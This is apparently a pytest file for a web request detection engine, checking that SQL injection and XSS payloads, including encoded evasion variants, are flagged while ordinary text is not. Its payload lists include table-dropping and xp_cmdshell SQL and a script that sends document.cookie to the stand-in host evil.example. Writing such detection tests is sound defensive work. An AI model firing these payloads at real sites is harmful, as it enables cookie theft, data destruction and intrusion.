"""Signature tests: known attacks must match, and ordinary text must not."""
from __future__ import annotations

import time

import pytest

from app.detection.engine import inspect_request, scan_value
from app.detection.normalizer import compact, deep_decode, normalize
from app.detection.redaction import redact_query, redact_text

SQLI = [
    "' OR '1'='1",
    "' or 1=1 --",
    "1 OR 1=1",
    "admin'--",
    "' UNION SELECT username, password FROM users --",
    "1 UNION ALL SELECT NULL,NULL,NULL",
    "1; DROP TABLE users",
    "'; DELETE FROM orders WHERE 1=1; --",
    "1 AND SLEEP(5)",
    "1'; WAITFOR DELAY '0:0:5' --",
    "1 AND (SELECT pg_sleep(5))",
    "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
    "1' ORDER BY 10 --",
    "' AND extractvalue(1,concat(0x7e,version())) --",
    "'; EXEC xp_cmdshell('dir'); --",
]

SQLI_EVASION = [
    "%27%20OR%20%271%27%3D%271",
    "%2527%2520OR%25201%253D1%2520--",
    "1 UnIoN SeLeCt 1,2,3",
    "1 UN/**/ION SEL/**/ECT 1,2",
    "1/**/UNION/**/SELECT/**/1,2",
    "1 UNION%0ASELECT 1,2",
    "&#39; OR &#39;1&#39;=&#39;1",
    "\\u0027 OR \\u00271\\u0027=\\u00271",
    "JyBPUiAnMSc9JzE=",
]

XSS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\" onmouseover=\"alert(1)",
    "' autofocus onfocus='alert(1)",
    "javascript:alert(document.cookie)",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    "<details open ontoggle=alert(1)>",
    "<object data=\"data:text/html;base64,PHNjcmlwdD4=\"></object>",
    "<script>document.location='http://evil.example/?c='+document.cookie</script>",
]

XSS_EVASION = [
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "<ScRiPt>alert(1)</sCrIpT>",
    "< script >alert(1)</ script >",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#60;img src=x onerror=alert(1)&#62;",
    "java\tscript:alert(1)",
    "jav&#x0A;ascript:alert(1)",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
]

BENIGN = [
    "hello world",
    "O'Brien",
    "It's a great product, isn't it?",
    "Please select a plan from the list",
    "union of students",
    "Drop me a line when you can",
    "I love this <3",
    "3 > 2 and 1 < 2",
    "price=10&quantity=2",
    "rock and roll",
    "update your profile",
    "Delete from cart",
    "Tom & Jerry",
    "mailto:someone@example.com",
    "javascript tutorial for beginners",
    "how to use the script tag in html",
    "SELECT books from the shelf",
    "order by price",
    "2024-01-05T10:00:00Z",
    "Authorization required",
    "C:\\Users\\Public\\file.txt",
    "https://example.com/a/b?c=d",
    "/api/products/1",
    "It's 100% free -- no card needed",
    "the sleep(well) club",
    "alert the team",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
]


@pytest.mark.parametrize("payload", SQLI + SQLI_EVASION)
def test_sqli_detected(payload: str) -> None:
    assert any(f.attack == "sqli" for f in scan_value(payload, "query")), payload


@pytest.mark.parametrize("payload", XSS + XSS_EVASION)
def test_xss_detected(payload: str) -> None:
    assert any(f.attack == "xss" for f in scan_value(payload, "query")), payload


@pytest.mark.parametrize("text", BENIGN)
def test_benign_text_not_flagged(text: str) -> None:
    assert scan_value(text, "query") == [], text


def test_payload_found_in_each_request_part() -> None:
    payload = "<script>alert(1)</script>"
    assert inspect_request("/", "q=" + payload, {}, b"")
    assert inspect_request("/" + payload, "", {}, b"")
    assert inspect_request("/", "", {"user-agent": payload}, b"")
    assert inspect_request("/", "", {"content-type": "text/plain"}, payload.encode())


def test_nested_json_value_detected() -> None:
    body = b'{"user":{"filters":[{"name":"\' UNION SELECT 1,2 --"}]}}'
    findings = inspect_request("/api", "", {"content-type": "application/json"}, body)
    assert any(f.attack == "sqli" for f in findings)


def test_payload_split_across_repeated_parameters_detected() -> None:
    findings = inspect_request("/", "a=1 UNION&a=SELECT 1,2", {}, b"")
    assert any(f.attack == "sqli" for f in findings)


def test_ordinary_cookie_not_flagged() -> None:
    cookie = "theme=dark; session=abc123; cart='two items'"
    assert inspect_request("/", "", {"cookie": cookie}, b"") == []


def test_most_severe_finding_comes_first() -> None:
    findings = inspect_request("/", "q=' UNION SELECT 1 -- <img src=x onerror=alert(1)>", {}, b"")
    assert findings[0].severity == "critical"


def test_deep_decode_handles_triple_encoding() -> None:
    assert deep_decode("%25253Cscript%25253E") == "<script>"


def test_normalize_and_compact() -> None:
    assert normalize("A/*x*/B") == "a b"
    assert compact("UN/**/ION  SEL/**/ECT") == "unionselect"


@pytest.mark.parametrize(
    "evil",
    ["a" * 60000, "<" * 60000, "'" + " or " * 15000, "<a " + "x" * 60000, "%25" * 20000, "<svg " * 12000],
)
def test_crafted_input_cannot_slow_the_engine(evil: str) -> None:
    start = time.perf_counter()
    scan_value(evil, "query")
    assert time.perf_counter() - start < 2.0


def test_redacts_sensitive_query_values() -> None:
    result = redact_query("user=sara&password=hunter2&token=abc")
    assert result is not None
    assert "hunter2" not in result and "abc" not in result and "sara" in result


def test_redacts_jwt_and_inline_secret_from_text() -> None:
    text = "password=hunter2 token eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0.abcdefghijk"
    cleaned = redact_text(text)
    assert "hunter2" not in cleaned and "eyJhbGci" not in cleaned


def test_base64_hidden_under_url_encoding_is_unwrapped() -> None:
    # Found with the Attack lab: base64 of an attack, then URL-encoded on top.
    from app.detection.engine import scan_value
    hidden = "".join(f"%{b:02X}" for b in b"JyBPUiAnMSc9JzE=")
    assert any(f.attack == "sqli" for f in scan_value(hidden, "query"))
